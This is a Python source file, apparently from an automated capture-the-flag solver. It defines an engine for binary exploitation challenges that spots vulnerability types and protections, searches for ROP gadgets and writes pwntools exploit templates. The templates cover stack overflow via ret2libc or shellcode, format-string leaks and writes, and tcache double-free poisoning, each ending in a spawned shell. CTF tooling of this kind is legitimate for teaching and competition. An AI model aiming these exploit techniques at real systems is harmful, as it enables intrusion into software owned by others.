"""
PWN Solving Engine
Specialized engine for binary exploitation challenges
"""

import re
import struct
import time
from typing import Any, Optional, TYPE_CHECKING

from .base import SolvingEngine, EngineResult, EngineCapability

if TYPE_CHECKING:
    from ..core.orchestrator import Challenge

# Optional pwntools
try:
    from pwn import ELF, context, ROP
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False


class PwnEngine(SolvingEngine):
    """
    Binary exploitation challenge solving engine.

    Handles:
    - Buffer overflow (stack, heap)
    - Format string vulnerabilities
    - ROP chain construction
    - Return-to-libc attacks
    - Integer overflow
    - Use-after-free
    - Shellcode generation
    """

    # Security feature patterns
    CHECKSEC_PATTERNS = {
        'canary': [r'canary', r'stack.?protect', r'__stack_chk'],
        'nx': [r'\bNX\b', r'no.?execute', r'DEP\b'],
        'pie': [r'\bPIE\b', r'position.?independent'],
        'relro': [r'RELRO', r'rel\.ro'],
        'aslr': [r'ASLR'],
    }

    # Vulnerability indicators
    VULN_PATTERNS = {
        'buffer_overflow': [
            r'gets\s*\(', r'strcpy\s*\(', r'strcat\s*\(',
            r'sprintf\s*\(', r'scanf\s*\(.+%s',
            r'\boverflow\b', r'\bbof\b', r'stack',
        ],
        'format_string': [
            r'printf\s*\([^"]*\)', r'fprintf\s*\([^,]*,[^"]*\)',
            r'%n', r'%\d+\$', r'format.?string',
        ],
        'heap': [
            r'malloc', r'free', r'realloc', r'calloc',
            r'heap', r'chunk', r'tcache', r'fastbin',
            r'use.?after.?free', r'double.?free', r'UAF',
        ],
        'integer_overflow': [
            r'integer', r'int\s+overflow', r'unsigned',
            r'size_t', r'wraparound',
        ],
        'shellcode': [
            r'shellcode', r'execve', r'mprotect',
            r'read.?write.?execute', r'rwx',
        ],
    }

    # Common binary architectures
    ARCH_PATTERNS = {
        'x86': [r'x86', r'i386', r'32.?bit', r'elf32'],
        'x64': [r'x86.?64', r'amd64', r'64.?bit', r'elf64'],
        'arm': [r'\barm\b', r'aarch64', r'arm32', r'arm64'],
        'mips': [r'mips', r'mipsel'],
    }

    @property
    def name(self) -> str:
        return "pwn"

    @property
    def capabilities(self) -> list[EngineCapability]:
        caps = [
            EngineCapability.ANALYZE,
            EngineCapability.FILE_ANALYSIS,
            EngineCapability.EXPLOIT,
        ]
        if PWNTOOLS_AVAILABLE:
            caps.append(EngineCapability.REMOTE)
        return caps

    def analyze(self, challenge: "Challenge") -> dict[str, Any]:
        """Analyze a PWN challenge"""
        analysis = {
            "vuln_types": [],
            "security_features": {},
            "arch": None,
            "binary_info": {},
            "recommendations": [],
        }

        content = challenge.description.lower()

        # Read binary files if available
        for file_path in challenge.files:
            if self._is_elf(file_path):
                binary_info = self._analyze_binary(file_path)
                if binary_info:
                    analysis["binary_info"] = binary_info
                    analysis["security_features"] = binary_info.get("security", {})
                    analysis["arch"] = binary_info.get("arch")

        # Detect vulnerability types from description
        for vuln_type, patterns in self.VULN_PATTERNS.items():
            if any(re.search(p, content) for p in patterns):
                analysis["vuln_types"].append(vuln_type)

        # Detect architecture
        for arch, patterns in self.ARCH_PATTERNS.items():
            if any(re.search(p, content) for p in patterns):
                analysis["arch"] = arch
                break

        # Generate recommendations
        if "buffer_overflow" in analysis["vuln_types"]:
            if not analysis["security_features"].get("canary"):
                analysis["recommendations"].append("Stack overflow likely - try ROP chain")
            else:
                analysis["recommendations"].append("Canary present - look for leak or bruteforce")

        if "format_string" in analysis["vuln_types"]:
            analysis["recommendations"].append("Try format string exploit to leak addresses or write")

        if "heap" in analysis["vuln_types"]:
            analysis["recommendations"].append("Analyze heap allocation patterns for UAF/double-free")

        if not analysis["security_features"].get("nx"):
            analysis["recommendations"].append("NX disabled - shellcode injection possible")

        if not analysis["security_features"].get("pie"):
            analysis["recommendations"].append("PIE disabled - addresses are fixed")

        return analysis

    def solve(self, challenge: "Challenge", **kwargs) -> EngineResult:
        """Attempt to solve a PWN challenge"""
        start_time = time.time()
        result = EngineResult()

        try:
            tools = self._get_tools()["pwn"]

            result.add_step("Analyzing PWN challenge")

            # Analyze the challenge
            analysis = self.analyze(challenge)
            result.analysis = analysis

            # Find binary file
            binary_path = None
            for file_path in challenge.files:
                if self._is_elf(file_path):
                    binary_path = file_path
                    break

            if binary_path:
                result.add_step(f"Found binary: {binary_path}")

                # Run checksec
                checksec_result = self._run_checksec(binary_path, tools, result)
                if checksec_result:
                    result.data = {"checksec": checksec_result}

                # Generate exploit based on vulnerability type
                exploit = self._generate_exploit_template(analysis, binary_path, tools, result)
                if exploit:
                    result.data = result.data or {}
                    result.data["exploit_template"] = exploit
                    result.success = True
                    result.confidence = 0.6
                    result.add_step("Generated exploit template - manual verification required")

                # Try to find gadgets for ROP
                if "buffer_overflow" in analysis["vuln_types"]:
                    gadgets = self._find_rop_gadgets(binary_path, tools, result)
                    if gadgets:
                        result.data = result.data or {}
                        result.data["gadgets"] = gadgets[:20]

            else:
                # No binary, just analyze description
                result.add_step("No binary file found, providing general guidance")

                if analysis["vuln_types"]:
                    result.data = {
                        "detected_vulns": analysis["vuln_types"],
                        "recommendations": analysis["recommendations"],
                    }
                    result.success = True
                    result.confidence = 0.4
                else:
                    result.success = False
                    result.error = "Could not identify vulnerability type"

        except Exception as e:
            result.success = False
            result.error = str(e)

        result.duration = time.time() - start_time
        return result

    def can_handle(self, challenge: "Challenge") -> float:
        """Check if this looks like a PWN challenge"""
        score = 0.0
        content = challenge.description.lower()

        # Keyword matching
        pwn_keywords = [
            'pwn', 'exploit', 'binary', 'buffer', 'overflow',
            'rop', 'shellcode', 'elf', 'stack', 'heap',
            'libc', 'gadget', 'format string', 'bof',
        ]

        for keyword in pwn_keywords:
            if keyword in content:
                score += 0.1

        # Check for binary files
        for file_path in challenge.files:
            if self._is_elf(file_path):
                score += 0.4
                break

        # Check for remote target (usually nc)
        if challenge.remote:
            if 'nc ' in challenge.remote or ':' in challenge.remote:
                score += 0.1

        return min(score, 1.0)

    def _is_elf(self, file_path: str) -> bool:
        """Check if file is an ELF binary"""
        try:
            content = self._read_file(file_path, binary=True)
            if content and len(content) >= 4:
                return content[:4] == b'\x7fELF'
        except Exception:
            pass
        return False

    def _analyze_binary(self, file_path: str) -> Optional[dict]:
        """Analyze binary file for security features and info"""
        if not PWNTOOLS_AVAILABLE:
            return None

        try:
            elf = ELF(file_path, checksec=False)
            return {
                "arch": elf.arch,
                "bits": elf.bits,
                "endian": elf.endian,
                "entry": hex(elf.entry),
                "security": {
                    "canary": elf.canary,
                    "nx": elf.nx,
                    "pie": elf.pie,
                    "relro": elf.relro,
                },
                "got": {k: hex(v) for k, v in list(elf.got.items())[:10]},
                "plt": {k: hex(v) for k, v in list(elf.plt.items())[:10]},
            }
        except Exception:
            return None

    def _run_checksec(self, binary_path: str, tools, result: EngineResult) -> Optional[str]:
        """Run checksec on binary"""
        result.add_step("Running checksec analysis")

        try:
            checksec_result = tools.checksec(binary_path)
            result.add_step(f"Checksec: {checksec_result[:200]}...")
            return checksec_result
        except Exception as ex:
            result.add_step(f"Checksec failed: {ex}")
            return None

    def _find_rop_gadgets(self, binary_path: str, tools, result: EngineResult) -> Optional[list]:
        """Find ROP gadgets in binary"""
        result.add_step("Searching for ROP gadgets")

        try:
            gadgets_result = tools.find_gadgets(binary_path)
            result.add_step(f"Found gadgets: {gadgets_result[:100]}...")

            # Parse gadgets from result
            gadgets = []
            for line in gadgets_result.split('\n'):
                if ':' in line and ('ret' in line.lower() or 'pop' in line.lower()):
                    gadgets.append(line.strip())

            return gadgets

        except Exception as ex:
            result.add_step(f"Gadget search failed: {ex}")
            return None

    def _generate_exploit_template(
        self,
        analysis: dict,
        binary_path: str,
        tools,
        result: EngineResult
    ) -> Optional[str]:
        """Generate exploit template based on analysis"""
        result.add_step("Generating exploit template")

        vuln_types = analysis.get("vuln_types", [])
        security = analysis.get("security_features", {})
        arch = analysis.get("arch", "x64")

        template_parts = [
            "#!/usr/bin/env python3",
            "# Auto-generated PWN exploit template",
            "# WARNING: Requires manual customization",
            "",
            "from pwn import *",
            "",
            f"# Binary path",
            f'binary_path = "{binary_path}"',
            f'elf = ELF(binary_path)',
            "",
        ]

        # Add context setup
        if arch == "x86":
            template_parts.append("context(arch='i386', os='linux')")
        else:
            template_parts.append("context(arch='amd64', os='linux')")

        template_parts.append("")

        # Add connection setup
        template_parts.extend([
            "# Connection setup",
            "# For local testing:",
            "# p = process(binary_path)",
            "# For remote:",
            "# p = remote('HOST', PORT)",
            "",
        ])

        # Add exploit based on vulnerability type
        if "buffer_overflow" in vuln_types:
            template_parts.extend(self._get_bof_template(security))

        elif "format_string" in vuln_types:
            template_parts.extend(self._get_fmtstr_template())

        elif "heap" in vuln_types:
            template_parts.extend(self._get_heap_template())

        else:
            template_parts.extend([
                "# Generic payload template",
                "payload = b'A' * offset",
                "# Add your exploit here",
                "",
            ])

        # Add interactive mode
        template_parts.extend([
            "",
            "# Send payload",
            "p.sendline(payload)",
            "",
            "# Get shell",
            "p.interactive()",
        ])

        return "\n".join(template_parts)

    def _get_bof_template(self, security: dict) -> list[str]:
        """Get buffer overflow exploit template"""
        parts = [
            "# Buffer Overflow Exploit",
            "",
            "# Find offset using cyclic pattern:",
            "# cyclic(200)",
            "# cyclic_find(0x61616161)  # or crash address",
            "offset = 0  # TODO: Find correct offset",
            "",
        ]

        if security.get("nx"):
            # NX enabled - need ROP
            parts.extend([
                "# NX enabled - using ROP chain",
                "rop = ROP(elf)",
                "",
                "# Example: ret2libc",
                "# libc = ELF('libc.so.6')",
                "# libc.address = leaked_libc_base - libc.symbols['puts']",
                "",
                "# rop.call('system', [next(libc.search(b'/bin/sh'))])",
                "",
                "payload = b'A' * offset",
                "payload += rop.chain()",
            ])
        else:
            # NX disabled - shellcode
            parts.extend([
                "# NX disabled - using shellcode",
                "shellcode = asm(shellcraft.sh())",
                "",
                "# Adjust buffer address as needed",
                "buf_addr = 0x0  # TODO: Find buffer address",
                "",
                "payload = shellcode",
                "payload = payload.ljust(offset, b'\\x90')",
                "payload += p64(buf_addr)  # or p32 for 32-bit",
            ])

        if security.get("canary"):
            parts.extend([
                "",
                "# WARNING: Stack canary detected!",
                "# Need to leak canary first or use format string",
                "# canary = u64(leak[:8])",
                "# payload = b'A' * offset_to_canary",
                "# payload += p64(canary)",
                "# payload += b'B' * 8  # saved rbp",
                "# payload += <return address>",
            ])

        if security.get("pie"):
            parts.extend([
                "",
                "# WARNING: PIE enabled!",
                "# Need to leak binary base address",
                "# elf.address = leaked_addr - elf.symbols['main']",
            ])

        return parts

    def _get_fmtstr_template(self) -> list[str]:
        """Get format string exploit template"""
        return [
            "# Format String Exploit",
            "",
            "# Leak addresses",
            "# for i in range(1, 20):",
            "#     p.sendline(f'%{i}$p')",
            "#     print(f'{i}: {p.recvline()}')",
            "",
            "# Write to arbitrary address",
            "# from pwnlib.fmtstr import fmtstr_payload",
            "# payload = fmtstr_payload(",
            "#     offset,           # Format string offset",
            "#     {target: value},  # What to write where",
            "#     write_size='short'",
            "# )",
            "",
            "# Leak example",
            "p.sendline(b'%7$p')  # Adjust offset",
            "leak = int(p.recvline().strip(), 16)",
            "print(f'Leaked: {hex(leak)}')",
            "",
            "payload = b''  # TODO: Build format string payload",
        ]

    def _get_heap_template(self) -> list[str]:
        """Get heap exploitation template"""
        return [
            "# Heap Exploitation Template",
            "",
            "# Common heap operations",
            "def alloc(size, data=b'A'):",
            "    p.sendlineafter(b'> ', b'1')  # Adjust menu",
            "    p.sendlineafter(b'Size: ', str(size).encode())",
            "    p.sendlineafter(b'Data: ', data)",
            "",
            "def free(idx):",
            "    p.sendlineafter(b'> ', b'2')  # Adjust menu",
            "    p.sendlineafter(b'Index: ', str(idx).encode())",
            "",
            "def show(idx):",
            "    p.sendlineafter(b'> ', b'3')  # Adjust menu",
            "    p.sendlineafter(b'Index: ', str(idx).encode())",
            "    return p.recvline()",
            "",
            "# Tcache poisoning example (glibc 2.27+)",
            "# alloc(0x20, b'AAAA')  # chunk 0",
            "# alloc(0x20, b'BBBB')  # chunk 1",
            "# free(0)",
            "# free(1)",
            "# free(0)  # double free in tcache",
            "# alloc(0x20, p64(target_addr))",
            "# alloc(0x20, b'CCCC')",
            "# alloc(0x20, payload)  # Write to target_addr",
            "",
            "payload = b''  # TODO: Build heap exploit",
        ]

    def _generate_shellcode(self, arch: str, tools, result: EngineResult) -> Optional[str]:
        """Generate shellcode for architecture"""
        result.add_step(f"Generating shellcode for {arch}")

        try:
            if arch == "x86":
                shellcode_result = tools.shellcode_generate(
                    arch="x86",
                    os="linux",
                    payload_type="shell"
                )
            else:
                shellcode_result = tools.shellcode_generate(
                    arch="amd64",
                    os="linux",
                    payload_type="shell"
                )

            result.add_step(f"Shellcode generated ({len(shellcode_result)} bytes)")
            return shellcode_result

        except Exception as ex:
            result.add_step(f"Shellcode generation failed: {ex}")
            return None
